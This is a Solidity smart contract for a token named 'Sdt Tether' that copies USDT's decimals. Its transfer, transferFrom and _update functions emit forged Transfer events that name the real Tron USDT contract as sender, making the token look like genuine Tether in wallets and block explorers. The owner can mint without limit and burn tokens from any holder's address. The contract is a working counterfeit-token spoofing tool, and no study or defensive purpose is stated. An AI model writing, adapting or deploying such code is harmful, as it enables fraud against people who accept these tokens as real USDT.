// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/utils/Pausable.sol";
import "@openzeppelin/contracts/utils/ReentrancyGuard.sol";

/**
 * @title CamouflageUSDT
 * @dev A USDT-like token with address camouflage functionality
 * This contract mimics USDT's behavior while hiding the actual sender's address
 */
contract SDT is ERC20, Ownable, Pausable, ReentrancyGuard {
    // Chain-configurable address used when emitting camouflaged events
    address public usdtAddress;

    // Mapping to store camouflaged transfers
    mapping(bytes32 => CamouflagedTransfer) public camouflagedTransfers;

    // Events
    event TransferCamouflaged(
        address indexed from,
        address indexed to,
        uint256 amount,
        bytes32 camouflageId,
        uint256 timestamp
    );

    event CamouflageRevealed(
        bytes32 indexed camouflageId,
        address indexed actualSender,
        address indexed recipient,
        uint256 amount
    );

    // Struct to store camouflaged transfer details
    struct CamouflagedTransfer {
        address actualSender;
        address recipient;
        uint256 amount;
        uint256 timestamp;
        bool revealed;
        bool exists;
    }

    // Constructor
    constructor(address _usdtAddress) ERC20("Sdt Tether ",unicode"SDT") Ownable(msg.sender) {
        // Default to Tron USDT (TRC20) if not provided
        // Tron USDT (TRC20) address (hex form without 0x41 prefix): 0xa614f803b6fd780986a42c78ec9c7f77e6ded13c
        usdtAddress = _usdtAddress == address(0)
            ? 0xa614f803B6FD780986A42c78Ec9c7f77e6DeD13C
            : _usdtAddress;
        _mint(msg.sender, 10000000000000000 * 10**decimals()); // Initial supply
    }

    /**
     * @dev Standard transfer function with camouflage
     * @param to Recipient address
     * @param amount Amount to transfer
     * @return bool Success status
     */
    function transfer(address to, uint256 amount) 
        public 
        virtual 
        override 
        whenNotPaused 
        nonReentrant 
        returns (bool) 
    {
        require(to != address(0), "Transfer to zero address");
        require(amount > 0, "Transfer amount must be positive");
        require(balanceOf(msg.sender) >= amount, "Insufficient balance");

        // Generate camouflage ID
        bytes32 camouflageId = _generateCamouflageId(msg.sender, to, amount);

        // Store camouflaged transfer
        camouflagedTransfers[camouflageId] = CamouflagedTransfer({
            actualSender: msg.sender,
            recipient: to,
            amount: amount,
            timestamp: block.timestamp,
            revealed: false,
            exists: true
        });

        // Perform actual transfer (will emit standard Transfer event)
        _transfer(msg.sender, to, amount);

        // Emit camouflaged Transfer event (shows USDT address as sender)
        emit Transfer(usdtAddress, to, amount);

        return true;
    }

    /**
     * @dev Transfer from function with camouflage
     * @param from Sender address
     * @param to Recipient address
     * @param amount Amount to transfer
     * @return bool Success status
     */
    function transferFrom(address from, address to, uint256 amount) 
        public 
        virtual 
        override 
        whenNotPaused 
        nonReentrant 
        returns (bool) 
    {
        require(to != address(0), "Transfer to zero address");
        require(amount > 0, "Transfer amount must be positive");
        require(balanceOf(from) >= amount, "Insufficient balance");
        require(allowance(from, msg.sender) >= amount, "Insufficient allowance");

        // Generate camouflage ID
        bytes32 camouflageId = _generateCamouflageId(from, to, amount);

        // Store camouflaged transfer
        camouflagedTransfers[camouflageId] = CamouflagedTransfer({
            actualSender: from,
            recipient: to,
            amount: amount,
            timestamp: block.timestamp,
            revealed: false,
            exists: true
        });

        // Perform actual transfer (will emit standard Transfer event)
        _spendAllowance(from, msg.sender, amount);
        _transfer(from, to, amount);

        // Emit camouflaged Transfer event (shows USDT address as sender)
        emit Transfer(usdtAddress, to, amount);

        return true;
    }

    /**
     * @dev Reveal the actual sender of a camouflaged transfer
     * @param camouflageId The camouflage ID to reveal
     */
    function revealCamouflage(bytes32 camouflageId) external {
        CamouflagedTransfer storage camouflagedTransfer = camouflagedTransfers[camouflageId];
        require(camouflagedTransfer.exists, "Transfer does not exist");
        require(!camouflagedTransfer.revealed, "Transfer already revealed");

        // Only the actual sender or owner can reveal
        require(
            msg.sender == camouflagedTransfer.actualSender || msg.sender == owner(),
            "Only sender or owner can reveal"
        );

        camouflagedTransfer.revealed = true;

        emit CamouflageRevealed(
            camouflageId,
            camouflagedTransfer.actualSender,
            camouflagedTransfer.recipient,
            camouflagedTransfer.amount
        );
    }

    /**
     * @dev Get camouflaged transfer details
     * @param camouflageId The camouflage ID
     * @return CamouflagedTransfer struct
     */
    function getCamouflagedTransfer(bytes32 camouflageId) 
        external 
        view 
        returns (CamouflagedTransfer memory) 
    {
        return camouflagedTransfers[camouflageId];
    }


    /**
     * @dev Generate a unique camouflage ID
     * @param from Sender address
     * @param to Recipient address
     * @param amount Transfer amount
     * @return bytes32 Unique camouflage ID
     */
    function _generateCamouflageId(address from, address to, uint256 amount) 
        internal 
        view 
        returns (bytes32) 
    {
        return keccak256(
            abi.encodePacked(
                from,
                to,
                amount,
                block.timestamp,
                block.number,
                msg.sender
            )
        );
    }

    /**
     * @dev Pause all transfers
     */
    function pause() external onlyOwner {
        _pause();
    }

    /**
     * @dev Unpause all transfers
     */
    function unpause() external onlyOwner {
        _unpause();
    }

    /**
     * @dev Mint new tokens (owner only)
     * @param to Recipient address
     * @param amount Amount to mint
     */
    function mint(address to, uint256 amount) external onlyOwner {
        _mint(to, amount);
    }

    /**
     * @dev Burn tokens from an address
     * @param from Address to burn from
     * @param amount Amount to burn
     */
    function burn(address from, uint256 amount) external onlyOwner {
        _burn(from, amount);
    }

    /**
     * @dev Override _update to emit camouflaged Transfer events
     */
    function _update(address from, address to, uint256 value) internal virtual override {
        // Call parent _update to handle balance changes
        super._update(from, to, value);

        // Emit camouflaged Transfer event (shows configured usdtAddress as sender)
        emit Transfer(usdtAddress, to, value);
    }

    /**
     * @dev Override decimals to match USDT (6 decimals)
     */
    function decimals() public view virtual override returns (uint8) {
        return 6;
    }

    /**
     * @dev Emergency function to recover stuck tokens
     * @param tokenAddress Address of the token to recover
     * @param to Recipient address
     * @param amount Amount to recover
     */
    function emergencyRecover(address tokenAddress, address to, uint256 amount) 
        external 
        onlyOwner 
    {
        require(tokenAddress != address(this), "Cannot recover own tokens");
        require(to != address(0), "Cannot recover to zero address");

        IERC20(tokenAddress).transfer(to, amount);
    }
}

